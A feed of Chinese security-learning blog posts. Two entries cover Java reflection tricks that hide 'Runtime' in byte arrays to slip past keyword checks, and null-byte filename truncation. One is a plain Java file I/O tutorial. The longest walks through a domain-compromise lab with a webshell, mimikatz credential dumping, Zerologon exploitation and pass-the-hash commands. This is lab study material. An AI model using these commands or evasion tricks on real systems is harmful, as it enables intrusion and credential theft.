class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">        String rt = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;);</span><br><span class="hljs-comment">*/</span><br>        String rt = <span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] bytes = rt.getBytes();<br>        System.out.println(Arrays.toString(bytes));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211015140423647.png" alt="image-20211015140423647"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 字节数组转字符串</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        String str = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        System.out.println(str);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211015140627401.png" alt="image-20211015140627401"></p><h2 id="Runtime-命令执行"><a href="#Runtime-命令执行" class="headerlink" title="Runtime 命令执行"></a>Runtime 命令执行</h2><p>避免程序出现 <code>Runtime</code> 关键字，可以使用字节数组来绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;<br>        String runtime  = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;);<br>        Class rt = Class.forName(runtime);<br>        Constructor cons = rt.getDeclaredConstructor();<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object run = cons.newInstance();<br>        Method exec = rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(run,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a><img src="https://gitee.com/lcdm123/image/raw/master/image-20211015143252943.png" alt="image-20211015143252943">ProcessBuilder命令执行</h2><p>之前记录过……</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对类熟练使用后，后面就能使用各种变形来绕过检查执行命令了</p><p>简单记录一下，万一后面有用呢🤪</p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java空字节漏洞</title>
    <link href="/2021/10/15/java%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/10/15/java%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-空字节截断漏洞"><a href="#Java-空字节截断漏洞" class="headerlink" title="Java 空字节截断漏洞"></a>Java 空字节截断漏洞</h1><p>Java空字节漏洞影响的是 JDK 版本小于 7u40</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">创建文件时使用<br>E:\\test.txt\u0000.jpg<br>最后的文件会变成 E:\\test.txt<br></code></pre></td></tr></table></figure><p>漏洞的利用场景更多在于黑名单后缀名限制</p><blockquote><p>没有去配环境，所以就这样直接记录吧</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java文件操作</title>
    <link href="/2021/10/13/java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/10/13/java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-文件系统"><a href="#Java-文件系统" class="headerlink" title="Java 文件系统"></a>Java 文件系统</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java 是一个跨平台的语言，不同的操作系统具有完全不一样的文件系统和特性。JDK会根据不同的操作系统编译成不同的版本。Java 对文件的任何操作都是通过 JNI 调用 C 语言函数实现的。Java 为了能够实现跨操作系统对文件就行操作抽象了一个 <code>FileSystem</code> 的对象，不同的操作系统只需要实现抽象出来的文件操作方法就可以实现跨屏平台的文件操作。</p><h2 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h2><p>在 Java SE中内置了两类文件系统：<code>java.io</code> 和 <code>java.nio</code>， <code>java.nio</code>的实现是<code>sun.nio</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012205656607.png" alt="image-20211012205656607"></p><p>Java 抽象出了一个 <code>java.io.FileSystem</code> 不同的操作系统有不一样的文件系统，<code>java.io.UnixFileSystem</code> <code>java.io.WinFileSystem</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012211740019.png" alt="image-20211012211740019"></p><p><code>java.io.FileSystem</code> 是一个抽象类，它抽象了对文件的操作，不同操作系统版本的 JDK 会实现其抽象的方法从而就实现了跨平台的文件访问操作</p><p>Java 对文件的操作最终都会调用动态链接库中 C 实现的 Java Native 方法</p><p><strong>注意</strong></p><ol><li>并不是所有的文件操作都在 <code>java.io.FileSystem</code> 中定义，文件的读取最终调用的是<code>java.io.FileInputStream#read0、readBytes</code>、<code>java.io.RandomAccessFile#read0、readBytes</code>，而写文件调用的是<code>java.io.FileOutputStream#writeBytes</code>、<code>java.io.RandomAccessFile#write0</code></li><li>Java 有两类文件系统 API，基于阻塞模式的 IO 的文件系统，另一个是 JDK7 + 基于NIO.2 的文件系统</li></ol><h2 id="流"><a href="#流" class="headerlink" title="流"></a>流</h2><p>流是一个抽象的概念，是对输入输出设备的抽象，Java 程序中，对于数据的 输入/ 输出 操作都是以流的方式进行。设备包括文件，网络，内存。流具有方向性，至于是输入流还是输出流则是一个相对的概念。当程序需要从某个数据源读取数据的时候，就会开启一个输入流，数据源可以是文件、内存或网络。需要写入数据到某个数据源目的地的时候，也会开启一个输出流，这个数据源目的地可以是文件、内存或网络。</p><p>流的分类:</p><ol><li>处理的数据单位不同可分为：字符流、字节流</li><li>数据流方向不同可分为：输入流、输出流</li><li>功能不同可分为：节点流、处理流</li></ol><p>节点流：节点流从一个特定的数据源读写数据。即节点流是直接操作文件，网络等的流，例如<code>FileInputStream</code>和<code>FileOutputStream</code> 他们直接从文件中读取或网文件中写入字节流。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013141241721.png" alt="image-20211013141241721"></p><p>处理流：”连接“在已存在的流（节点流或处理流）之上通过对数据的处理为程序提供更为强大的读写功能。过滤流是使用一个已经存在的输入流或输出流连接创建的，过滤流就是对节点流进行一系列的包装。例如<code>BufferedInputStream</code>和<code>BufferedOutputStream</code>，使用已经存在的节点流来构造，提供带缓冲的读写，提高了读写的效率，以及<code>DataInputStream</code>和<code>DataOutputStream</code>，使用已经存在的节点流来构造，提供了读写Java中的基本数据类型的功能。他们都属于过滤流。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013141458973.png" alt="image-20211013141458973"></p><p><strong>流结构</strong></p><p>Java 所有的流类位于<code>java.io</code>包中，都分别继承以下四个抽象流类型</p><table><thead><tr><th></th><th>字节流</th><th>字符流</th></tr></thead><tbody><tr><td>输入流</td><td><code>InputStream</code></td><td><code>Reader</code></td></tr><tr><td>输出流</td><td><code>OutputStream</code></td><td><code>Writer</code></td></tr></tbody></table><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013153458771.png" alt="image-20211013153458771"></p><p><strong>常见流</strong></p><ul><li>缓冲流：缓冲流要“套接”在相应的节点流之上，对读写的数据提供了缓冲的功能，提高了读写效率，同事增加了一些新的方法</li><li>转换流：用于字节数据到字符数据之间的转换</li><li>数据流：提供了读写Java中的基本数据类型的功能</li><li>对象流：用于直接将对象写入写出</li></ul><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><blockquote><p>最开始有点理解错误了，直接导入 <code>java.io.FileSystem</code> 包发现不对，后面查了一下发现 <code>java.io.FileSystem</code> 是抽象类不能直接调用而应该调用 <code>java.io.File</code> 类 ，这个类是通过它实现的</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012234012387.png" alt="image-20211012234012387"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012235627129.png" alt="image-20211012235627129"></p><h3 id="字符流方法"><a href="#字符流方法" class="headerlink" title="字符流方法"></a><strong>字符流方法</strong></h3><p>文件读取操作</p><ol><li>先获得文件句柄</li><li>获得文件句柄当作是输入一个字节码流，需要对这个输入流进行读取</li><li>读取到输入流后，需要读取生成字节流</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用 BufferedReader 的 readLine() 方法</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        BufferedReader read = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;E:/test.txt&quot;</span>));<br>        String str;<br>        <span class="hljs-keyword">while</span>((str = read.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            System.out.println(str);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>FileReader </code>类是从 <code>InputStreamReader</code> 类继承而来。该类按字符读取流中数据</p><p>在给定从中读取数据的<code>File</code>的情况下创建一个 <code>FileReader</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013132110815.png" alt="image-20211013132110815"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013133158759.png" alt="image-20211013133158759"></p><p>文件写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// BufferedWriter</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        BufferedWriter out = <span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> FileWriter(file));<br>        String str = <span class="hljs-string">&quot;文件写入！！！&quot;</span>;<br>        out.write(str);<br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>BufferedWriter</code>属于字符流体系中的一员，与 <code>FileWriter</code> 不同的是 <code>BufferedWriter</code> 自带缓冲区</p></blockquote><p>读取和写入的操作类似</p><h3 id="字节流方法"><a href="#字节流方法" class="headerlink" title="字节流方法"></a><strong>字节流方法</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 读取文件</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(file);<br>        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> length = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ((length = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> String(bytes,<span class="hljs-number">0</span>,length));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// read 是读取 bytes 长读的字节数</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 写入文件</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        FileOutputStream test = <span class="hljs-keyword">new</span> FileOutputStream(file);<br>        String str = <span class="hljs-string">&quot;hello lcdm123!!!&quot;</span>;<br>        <span class="hljs-comment">// 将字符串转换为二进制文件</span><br>        <span class="hljs-keyword">byte</span>[] b = str.getBytes();<br>        <span class="hljs-comment">// 写入</span><br>        test.write(b);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于文件的操作 Java 还有很多方法，需要后面遇到再做处理</p><blockquote><p>对于各类的操作直接看 java 文档就可以了</p></blockquote><p>参考文章</p><p><a href="https://blog.csdn.net/u013087513/article/details/51999533">https://blog.csdn.net/u013087513/article/details/51999533</a></p><p><a href="https://segmentfault.com/a/1190000038575475">https://segmentfault.com/a/1190000038575475</a></p><p><a href="https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html">https://www.cnblogs.com/shitouer/archive/2012/12/19/2823641.html</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日靶场一</title>
    <link href="/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
    <url>/2021/10/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="红日靶场-一"><a href="#红日靶场-一" class="headerlink" title="红日靶场 一"></a>红日靶场 一</h1><blockquote><p>环境搭配没什么大问题，改一下host文件就可以了</p></blockquote><h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>弱口令进入后台，然后寻找 getshell 的突破口</p><blockquote><p>后台获取 shell 的突破口常常在 插件和模板这些地方</p></blockquote><p>在模板编辑处写入冰蝎马</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901175424900.png" alt="image-20210901175424900"></p><p>然后找到模板保存位置，利用冰蝎连接<code>/yxcms/protected/apps/default/view/default/shell.php</code></p><p>获取到 shell 后就可以考虑上线 CS 和 MSF 了，常规步骤，利用 CS 建立监听器，然后生成 exe，上传到靶机，执行 exe，之后就可以上线了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901180914459.png" alt="image-20210901180914459"></p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查询当前用户 <code>whoami</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181220725.png" alt="image-20210901181220725"></p><blockquote><p>这里看到获取到的权限是 administrator 权限， 但是在 Windows 系统中，我们提权的目标是 SYSTEM 权限</p></blockquote><p>查看IP <code>ipconfig</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181439936.png" alt="image-20210901181439936"></p><blockquote><p>存在内网地址就可能有域，就会涉及到后期的域渗透</p></blockquote><p><code>net user</code> 本地账户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902094457893.png" alt="image-20210902094457893"></p><p>获取系统信息 <code>systeminfo</code> </p><blockquote><p>执行这个命令 CS 上没有返回结果 ？？？ 蚁剑冰蝎上面也不可以</p></blockquote><p><code>ipconfig /all</code> 这样可以查看到主机所在的域</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902092825067.png" alt="image-20210902092825067"></p><p>查看当前登录域 <code>net config workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902101455030.png" alt="image-20210902101455030"></p><p><code>wmic process get caption,commandline,processid /value</code> 查看运行的进程及路径（检查是否有杀软）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902093335151.png" alt="image-20210902093335151"></p><p>内网存活主机探测 <code> arp-scan.exe -t 10.10.3.0/24</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902095658350.png" alt="image-20210902095658350"></p><blockquote><p>存活的主机有 </p><p>10.10.3.131</p><p>10.10.3.132</p><p>10.10.3.133</p><p>可以选择多个工具扫描内网提高准确性</p></blockquote><p><code>ping god.org</code> 发现返回的 IP，确定 <code>10.10.3.131</code> 是域控</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902095939232.png" alt="image-20210902095939232"></p><p><strong>接下来可以主要收集域信息</strong></p><p>查询域 <code>net view /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902111026061.png" alt="image-20210902111026061"></p><p>查询域内所有计算机 <code>net view /domain:GOD</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902111236537.png" alt="image-20210902111236537"></p><p>域内用户 <code>net user /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902101310670.png" alt="image-20210902101310670"></p><p>查看域中的组 <code>net group /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902110326635.png" alt="image-20210902110326635"></p><blockquote><p>后面参考这个查看各组中的内容</p></blockquote><p>域管理员列表 <code>net group &quot;doamin admins&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902102913391.png" alt="image-20210902102913391"></p><p>域内查询域控<code>net group &quot;Domain Controllers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902102826503.png" alt="image-20210902102826503"></p><p>域内服务器 <code>net group &quot;Domain computer&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902110517911.png" alt="image-20210902110517911"></p><blockquote><p>先收集这些，后面需要用的时候再来收集一下</p></blockquote><p>还有一个选择就是直接依靠插件，但是前期练习不推荐使用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210901181750768.png" alt="image-20210901181750768"></p><h3 id="获取域控权限"><a href="#获取域控权限" class="headerlink" title="获取域控权限"></a>获取域控权限</h3><p>首先使用 MS14-058 将 web 靶机提权</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902112119070.png" alt="image-20210902112119070"></p><p>开启远程桌面，放行 3389 端口</p><p>使用 mimikatz 抓取到本地的账户密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902114020655.png" alt="image-20210902114020655"></p><p>连接到远程桌面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902142806122.png" alt="image-20210902142806122"></p><p>下一步获取域控权限</p><blockquote><p>获取域控权限的漏洞主要有 MS14-068  MS17-010  CVE-2020-1472  </p><p>最新的漏洞也不太了解</p></blockquote><p>可以先搭建内网代理，使 kali 能够访问到域控，这里选用 EW</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115415971.png" alt="image-20210902115415971"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115405766.png" alt="image-20210902115405766"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902115536863.png" alt="image-20210902115536863"></p><blockquote><p>连接成功，这样就可以利用 kali 访问到域控服务器了</p></blockquote><p>先为 msf 设置代理</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">setg Proxies socks5:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.15</span>:<span class="hljs-number">6000</span><br>setg ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>可以使用 MS17-010 执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902121355745.png" alt="image-20210902121355745"></p><p><del>尝试添加用户并且开启远程桌面</del> 又没有成功，事实证明永恒之蓝也不是很好用</p><p>使用 CVE-2020-1472 获取域控权限</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="bash"> mimikatz <span class="hljs-string">&quot;lsadump::zerologon /target:10.10.3.131 /account:OWA$&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>  <span class="hljs-comment"># 漏洞检测</span></span><br><span class="hljs-keyword">shell</span><span class="bash"> mimikatz <span class="hljs-string">&quot;lsadump::zerologon /target:10.10.3.131 /account:OWA$ /exploit&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> <span class="hljs-comment"># 置零</span></span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902134502718.png" alt="image-20210902134502718"></p><p>抓取现在的 hash</p><p><code>proxychains python3 secretsdump.py god.org/OWA\$@10.10.3.131 -no-pass</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902135849535.png" alt="image-20210902135849535"></p><p>之后利用 wmiexec.py 连接域控，下载 sam 文件为后期恢复密码做准备</p><p> <code>proxychains python3 wmiexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 god.org/administrator@10.10.3.131</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902140447430.png" alt="image-20210902140447430"></p><blockquote><p>代理不够稳定，执行命令的时候特别卡</p><p>动作要快！！ 添加用户，开启远程桌面</p></blockquote><p>然后恢复密码，先从之前下载的 save 文件中提取出 Hash</p><p><code>python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145355281.png" alt="image-20210902145355281"></p><p>恢复密码</p><p><code>proxychains python3 reinstall_original_pw.py OWA 10.10.3.131 1ce6842c848ce11741dc8f6932856bae</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145420146.png" alt="image-20210902145420146"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902145912439.png" alt="image-20210902145912439"></p><p><del>后面可以利用 IPC 连接域控，然后上传 CS 的 payload</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902150224971.png" alt="image-20210902150224971"></p><p><del>利用 PsExec 远程连接到域控主机，执行 CS Payload 上线 CS</del></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902150932353.png" alt="image-20210902150932353"></p><blockquote><p>上面的方法有点麻烦</p></blockquote><p>直接在 CS 上建立一个 SMB 监听，然后利用现有的 会话派生一个会话出来，之后在探测到内网存活主机的地方填入添加的用户，选择派生出来的会话和 SMB 监听，直接连接就可以上线 CS 了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153435066.png" alt="image-20210902153435066"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153458562.png" alt="image-20210902153458562"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153514666.png" alt="image-20210902153514666"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153545740.png" alt="image-20210902153545740"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210902153629576.png" alt="image-20210902153629576"></p><p>以同样的方法可以获取到内网另一台主机的会话，这样就可以拿下了域内所有权限了</p><p><img 